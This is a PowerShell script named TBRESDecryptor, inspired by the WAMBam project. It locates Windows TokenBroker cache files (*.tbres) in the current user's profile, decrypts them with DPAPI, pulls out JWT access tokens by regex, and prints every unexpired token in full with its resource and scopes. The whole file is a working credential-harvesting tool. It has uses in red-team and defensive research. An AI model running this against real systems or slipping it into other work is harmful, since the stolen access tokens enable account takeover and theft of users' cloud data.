Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.IO.Compression.FileSystem

<#
Inspired by https://github.com/xpn/WAMBam
#>

function DecodeJwtPayload {
    param([string]$Jwt)

    try {
        $payload = $Jwt.Split(".")[1]

        $remainder = $payload.Length % 4
        if ($remainder -gt 0) {
            $payload += "=" * (4 - $remainder)
        }
        $payload = $payload.Replace("-", "+").Replace("_", "/")
        $bytes = [System.Convert]::FromBase64String($payload)
        $json = [System.Text.Encoding]::UTF8.GetString($bytes)
        return ($json | ConvertFrom-Json)
    }
    catch {
        throw "Decode JWT failed: $($_.Exception.Message)"
    }
}

function Check-Token($AccessToken) {
    $jwtPayload = DecodeJwtPayload -Jwt $AccessToken
    
    $exp = ([DateTimeOffset]::FromUnixTimeSeconds($jwtPayload.exp)).LocalDateTime
    if ($exp -lt (Get-Date)) {
        return
    }

    Write-Host ("-" * 100)
    Write-Host "Valid token $exp"
    Write-Host "Resource: $($jwtPayload.aud)"
    Write-Host "Scope/Roles: $($jwtPayload.scp)"
    Write-Host "Token: $($AccessToken)"
    Write-Host ("-" * 100)
}

function Get-Tokens($decryptedString) {
    try {
        $pattern = '\beyJ0eX[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b'

        $matches = [regex]::Matches($decryptedString, $pattern)

        $tokens = @()
        foreach ($m in $matches) {
            $tokens += $m.Value
        }

        return $tokens | Sort-Object -Unique
    }
    catch {
        return @()
    }
}

function Output-DecryptedData($origFile, $jsonString) {
    try {
        $jsonObject = $jsonString | ConvertFrom-Json
        
        $encodedData = $jsonObject.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value
        
        $encryptedData = [Convert]::FromBase64String($encodedData)
        
        $decryptedData = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedData,
            [byte[]]$null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )

        $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedData)

        return $decryptedString
    }
    catch [System.IO.IOException] {
        #Write-Error "[!] Error Decrypting File: $origFile"
        return $null
    }
}

function Invoke-TBRESDecryptor {
    Write-Host "`n          --++[[ TBRESDecryptor ]]++--`n"
    
    $path = Join-Path $env:LOCALAPPDATA "Microsoft\TokenBroker\Cache"
    
    $files = Get-ChildItem -Path $path -Filter "*.tbres" -File | Select-Object -ExpandProperty FullName
    
    foreach ($file in $files) {
        $fileJSON = Get-Content -Path $file -Encoding Unicode -Raw
        
        if ($fileJSON.Length -gt 0) {
            $fileJSON = $fileJSON.Substring(0, $fileJSON.Length - 1)
        }
        
        $dec = Output-DecryptedData $file $fileJSON

        $tokens = Get-Tokens $dec
        
        if (-not $tokens -or $tokens.Count -eq 0) {
            continue
        }
        
        foreach ($token in $tokens) {
            Check-Token $token
        }
    }
}
